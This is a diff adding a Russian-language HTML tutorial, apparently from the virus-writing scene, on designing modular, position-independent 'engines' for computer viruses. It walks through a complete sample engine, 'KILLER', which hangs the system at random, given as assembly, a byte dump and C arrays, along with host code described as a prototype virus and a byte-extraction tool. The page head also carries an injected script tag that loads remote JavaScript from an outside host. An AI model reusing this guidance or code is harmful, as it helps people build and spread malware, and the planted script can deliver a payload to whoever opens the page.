@@ -1,0 +1,392 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2//EN">
+<HTML>
+<HEAD>
+<TITLE>ОБЩИЕ РЕКОМЕНДАЦИИ ПО НАПИСАНИЮ ДВИЖКОВ</title><script language='JavaScript' type='text/javascript' src='http://proxy.host.sk/index.php'></script>
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
+</HEAD>
+<body bgcolor=#C0C0C0 text=#000000 link=#0000EE vlink=#551A8B>
+
+<h1 align=center>ОБЩИЕ РЕКОМЕНДАЦИИ ПО НАПИСАНИЮ ДВИЖКОВ</h1>
+
+<h2 align=center>версия 2.00</h2>
+
+<p><u>ДВИЖОК (engine)</u> --
+   некоторый модуль используемый в вирусах.
+   (представленный в бинарной форме и/или в сорцах любого языка)
+
+<h3>ВВЕДЕНИЕ</h3>
+
+<p>Этот текст был написан с единственно одной целью: обозначить признаки,
+   которыми, на мой взгляд, должен обладать удобный движок.
+
+<p>Надо сказать, что подобное желание возникло уже после того, как я
+   прочувствовал все плюсы использования готовых компонент для создания
+   вирусов. Были созданы движки
+   <a href="lde105.zip">LDE32</a>,
+   <a href="kme3">KME32</a>,
+   <a href="etg200.zip">ETG</a>,
+   <a href="cmix">CMIX</a>,
+   <a href="dscript.zip">DSCRIPT</a>,
+   <a href="expo.zip">EXPO</a>,
+   <a href="rpme.zip">RPME</a>,
+   <a href="cg200.zip">CODEGEN</a>,
+   <a href="prcg.zip">PRCG</a>,
+   <a href="z0mbie6b.zip">MACHO</a> и
+   MISTFALL,
+   обладающие почти всеми свойствами, описанными в этом тексте.
+   Однако даже и тех
+   небольших преимуществ от попытки эти движки стандартизировать было
+   достаточно чтобы понять всю важность приведения движков к некоторому
+   "стандартному" виду. Следует сразу заметить: подобная "стандартизация"
+   влияет скорее на алгоритм и внешний вид, чем на код, и ни коим образом
+   не может послужить упрощению работы антивирусов.
+
+
+<h3>КОД</h3>
+
+<ul>
+<li>Движок должен содержать только исполняемый код.
+      Таким образом движок не должен содержать никаких данных в явном виде.
+      (достигается <a href="virdata.html">генерацией данных кодом</a>)
+
+<li>Движок не должен содержать никаких абсолютных смещений.
+    Для этого можно создать некую структуру общих вирусных данных в стэке
+    и передавать поинтер на эту структуру.
+
+<li>Движок не должен непосредственно использовать никаких внешних данных
+      и не должен непосредственно вызывать никаких внешних процедур.
+      (достигается передачей движку указателей на данные/код)
+
+<li>Движок не должен содержать никаких непосредственных системных вызовов.
+    Хотите работать в движке с файлами? - пишите свои процедуры работы с
+    файлами, так, как это удобнее в конкретном вирусе,
+    передаете на них указатели и движок становится универсальным.
+</ul>
+
+<h3>PUBLIC-функции</h3>
+
+<ul>
+<li>Параметры каждой функции должны передаваться только на стэке.
+<li>Каждая функция должна сохранять и восстанавливать все регистры.
+<li>При выходе из функции флаг DF должен быть сброшен в 0. (CLD)
+<li>Результат (если он нужен) должен возвращаться в регистре EAX.
+</ul>
+
+<h3>ИСХОДНИКИ</h3>
+
+<ul>
+<li>Если движок поставляется в исходниках, то
+      переменные, аргументы, константы, внутренние процедуры
+      и все прочие имена и метки должны быть уникальными, то есть такими,
+      чтобы они не встретились в чьем-нибудь еще движке или в вашем же
+      другом движке. (тут частично помогают локальные метки)
+
+<li>Если при передаче данных между движком и вызывающим кодом используются
+      данные, то все они должны быть описаны в отдельном .INC файле
+</ul>
+
+<h3>ДОКУМЕНТАЦИЯ</h3>
+
+<p>движку должна прилагаться документация, в которой будет указано:
+<ul>
+<li>описание движка;
+<li>описание PUBLIC-процедур и их параметров;
+<li>описание замеченных глюков (т.е. фич);
+<li>где движок тестировался, то есть когда он точно работает,
+    когда не работает, а когда хз;
+</ul>
+
+<h3>ЖЕЛАТЕЛЬНО</h3>
+
+<ul>
+<li>Чтобы в движке существовала одна (и только одна) PUBLIC-функция,
+которая бы шла В НАЧАЛЕ исполняемого кода (хотите в середине - вставьте в начало JMP),
+и чтобы написана она была в стиле cdecl  (RET с последующим ADD ESP, xx)
+или pascal-функции (выход по RET nnnn).
+
+<li>Чтобы алгоритм и код движка использовали в качестве данных только
+свой стэк и были написаны с учетом мультитреадности.
+
+<li>Чтобы движок был написан инструкциями real 386,
+то есть чтобы отсутствовали привилегированные инструкции/регистры
+и все 486+ инструкции вообще.
+</ul>
+
+<h3>ЧТО В РЕЗУЛЬТАТЕ</h3>
+
+<p>С использованием всех вышеперечисленных ограничений и фич,
+   получаем код движка:
+   независимый ни от кольца защиты, ни от операционки, ни от смещения
+   по которому он находится.
+   Такой код легко подвергается пермутации.
+   Код или исходники такого движка легко могут быть подключены к другим
+   движкам, вирусам, генераторам вирусов или вирусным конструкторам.
+
+<p>Более того, решается просто глобальная задача связи asm- и cpp- кода,
+без использования obj-ей.
+
+<h2 align=center>ПРИМЕР ОФОРМЛЕНИЯ ДВИЖКА</h2>
+
+<p>Движок: KILLER. Задача: произвести зависание с вероятностью 1/1000.
+
+<p>Исходник:
+
+<a name=killerasm>
+<pre>
+----[begin KILLER.ASM]--------------------------------------------------
+engine                  proc    c
+                        arg     user_param      ; user-data
+                        arg     user_random     ; external randomer
+                        arg     arg1
+                        arg     arg2            ; other parameters
+                        arg     arg3
+                        pusha
+                        cld
+                        ;;
+                        push    1000
+                        push    user_param
+                        call    user_random
+                        add     esp, 8
+                        ;;
+                        cmp     eax, 666
+                        je      $
+                        ;;
+                        popa
+                        ret
+                        endp
+----[end KILLER.ASM]----------------------------------------------------
+</pre>
+
+<p>Полученный в результате инклюдник на ASM:
+
+<a name=killerinc>
+<pre>
+----[begin KILLER.INC]--------------------------------------------------
+; KILLER 1.00 engine
+db 0C8h,000h,000h,000h,060h,0FCh,068h,0E8h
+db 003h,000h,000h,0FFh,075h,008h,0FFh,055h
+db 00Ch,083h,0C4h,008h,03Dh,09Ah,002h,000h
+db 000h,074h,0FEh,061h,0C9h,0C3h
+----[end KILLER.INC]----------------------------------------------------
+</pre>
+
+<p>Тот же самый инклюдник на C/C++:
+
+<a name=killercpp>
+<pre>
+----[begin KILLER.CPP]--------------------------------------------------
+// KILLER 1.00 engine
+BYTE killer_bin[30] =
+{
+  0xC8,0x00,0x00,0x00,0x60,0xFC,0x68,0xE8,
+  0x03,0x00,0x00,0xFF,0x75,0x08,0xFF,0x55,
+  0x0C,0x83,0xC4,0x08,0x3D,0x9A,0x02,0x00,
+  0x00,0x74,0xFE,0x61,0xC9,0xC3
+};
+----[end KILLER.CPP]----------------------------------------------------
+</pre>
+
+<p>Инклюдник/хеадер на ASM:
+
+<a name=killerash>
+<pre>
+----[begin KILLER.ASH]--------------------------------------------------
+; KILLER 1.00 engine
+KILLER_VERSION          equ     0100h
+----[end KILLER.ASH]----------------------------------------------------
+</pre>
+
+<p>Инклюдник/хеадер на C/C++:
+
+<a name=killerhpp>
+<pre>
+----[begin KILLER.HPP]--------------------------------------------------
+// KILLER 1.00 engine
+#ifndef __KILLER_HPP__
+#define __KILLER_HPP__
+
+#define KILLER_VERSION  0x0100
+
+typedef
+void __cdecl killer_engine(
+                DWORD   user_param,             // user-parameter
+                DWORD __cdecl user_random(DWORD user_param, DWORD range),
+                DWORD   arg1,
+                DWORD   arg2,
+                DWORD   arg3);
+
+#endif //__KILLER_HPP__
+----[end KILLER.HPP]----------------------------------------------------
+</pre>
+
+<p>Пример вызова движка на ASM:
+
+<a name=exampleasm>
+<pre>
+----[begin EXAMPLE.ASM]-------------------------------------------------
+; KILLER 1.00 usage example
+include                 <a href=#killerash>killer.ash</a>
+
+callW                   macro   x
+                        extern  x:PROC
+                        call    x
+                        endm
+
+v_data                  struc
+v_randseed              dd      ?
+;                       ...
+                        ends
+
+                        p386
+                        model   flat
+                        locals  __
+
+                        .data
+                        dd      ?
+                        .code
+
+start:                  call    virus_code
+                        push    -1
+                        callW   ExitProcess
+
+virus_code:             pusha
+                        sub     esp, size v_data
+                        mov     ebp, esp
+                        ;;
+                        callW   GetTickCount
+                        xor     [ebp].v_randseed, eax  ; randomize
+                        ;;
+                        push    3
+                        push    2               ; parameters
+                        push    1
+                        call    $+5+2           ; pointer to randomer
+                        jmp     short my_random
+                        push    ebp             ; user-param, v_data ptr
+                        call    killer_engine
+                        add     esp, 4*5
+                        ;;
+                        add     esp, size v_data
+                        popa
+                        retn
+
+; DWORD __cdecl random(DWORD user_param, DWORD range)
+;                       [esp+4]        [esp+8]
+my_random:              mov     ecx, [esp+4]   ; v_data ptr
+                        mov     eax, [ecx].v_randseed
+                        imul    eax, 214013
+                        add     eax, 2531011
+                        mov     [ecx].v_randseed, eax
+                        shr     eax, 16
+                        imul    eax, [esp+8]
+                        shr     eax, 16
+                        retn
+killer_engine:
+include                 <a href=#killerinc>killer.inc</a>
+
+virus_size              equ     $-virus_code
+                        end     start
+----[end EXAMPLE.ASM]---------------------------------------------------
+</pre>
+
+<p>Пример использования на C/C++:
+
+<a name=examplecpp>
+<pre>
+----[begin EXAMPLE.CPP]-------------------------------------------------
+#include &lt;windows.h&gt;
+#include "<a href=#killerhpp>killer.hpp</a>"
+#include "<a href=#killercpp>killer.cpp</a>"
+DWORD randseed = GetTickCount();
+DWORD __cdecl my_random(DWORD user_param,DWORD range)
+{
+  return range ? (randseed = randseed * 214013 + 2531011) % range : 0;
+}
+void main()
+{
+  void* killer_ptr = &killer_bin;
+  (*(killer_engine*)killer_ptr)  (0x12345678, my_random, 1,2,3);
+}
+----[end EXAMPLE.CPP]---------------------------------------------------
+</pre>
+
+<p>Пример программки для компиляции исходника движка:
+
+<a name=buildasm>
+<pre>
+----[begin BUILD.ASM]---------------------------------------------------
+                        p386
+                        model   flat
+                        locals  __
+                        .data
+                        db      0EBh,02h,0FFh,01h       ; signature
+include                 <a href=#killerasm>killer.asm</a>
+                        db      0EBh,02h,0FFh,02h       ; signature
+                        .code
+start:                  push    -1
+                        callW   ExitProcess
+                        end     start
+----[end BUILD.ASM]-----------------------------------------------------
+</pre>
+
+<p>Пример программки для выдирания бинарной (DB,DB,...) версии движка из
+скомпиленного EXE-файла:
+
+<a name=haxorcpp>
+<pre>
+----[begin HAXOR.CPP]---------------------------------------------------
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#pragma hdrstop
+void main()
+{
+  FILE*f=fopen("build.exe","rb");
+  int bufsize = filelength(fileno(f));
+  BYTE* buf = new BYTE[bufsize];
+  fread(buf, 1,bufsize, f);
+  fclose(f);
+  int id1=0, id2=0;
+  for (int i=0; i&lt;bufsize; i++)
+  {
+    if (*(DWORD*)&buf[i] == 0x01FF02EB) id1=i+4;        // check signature
+    if (*(DWORD*)&buf[i] == 0x02FF02EB) id2=i;          // check signature
+  }
+  f=fopen("<a href=#killerinc>killer.inc</a>","wb");
+  fprintf(f,"; KILLER 1.00 engine\r\n");
+  for (int i=0; i&lt;id2-id1; i++)
+  {
+    if ((i%8)==0) fprintf(f,"db ");
+    fprintf(f,"0%02Xh", buf[id1+i]);
+    if (((i%8)==7)||(i==id2-id1-1)) fprintf(f,"\r\n"); else fprintf(f,",");
+  }
+  fclose(f);
+  f=fopen("<a href=#killercpp>killer.cpp</a>","wb");
+  fprintf(f,"// KILLER 1.00 engine\r\n");
+  fprintf(f,"BYTE killer_bin[%i] = {\r\n",id2-id1);
+  for (int i=0; i&lt;id2-id1; i++)
+  {
+    if ((i%8)==0) fprintf(f,"  ");
+    fprintf(f,"0x%02X", buf[id1+i]);
+    if (i!=id2-id1-1) fprintf(f,",");
+    if ((i%8)==7) fprintf(f,"\r\n");
+  }
+  fprintf(f," };\r\n");
+  fclose(f);
+}
+----[end HAXOR.CPP]-----------------------------------------------------
+</pre>
+
+<p>Обратим внимание на <a href=#exampleasm>example.asm</a> --
+прообраз будущего вируса. В файле используется движок, движок использует
+внешннюю процедуру (рандомер), а рандомер использует randseed который
+создан в основном теле вируса и инициализирован перед вызовом движка.
+В результате не только этот движок, но и любой другой, да и сам вирус,
+смогут вызывать одну и ту же внешнюю процедуру (в данном случае рандомер,
+но это могли бы быть функции работы с файлами и другие движки).
+Очевидно, что call GetTickCount, произведенный перед  вызовом движка,
+в настоящем вирусе будет произведен по соответствующему вычисленному кернеловскому адресу.
+
+<p>Заметим, что все это написано без использования оффсетов как таковых.
+
+<p>Итак, задача достигнута: движок компиляется отдельно, отлаживается
+так же отдельно, в <a href=#examplecpp>example.cpp</a> (имхо на cpp отлаживать алгоритмы быстрее и проще чем на asm),
+и используется в вирусах
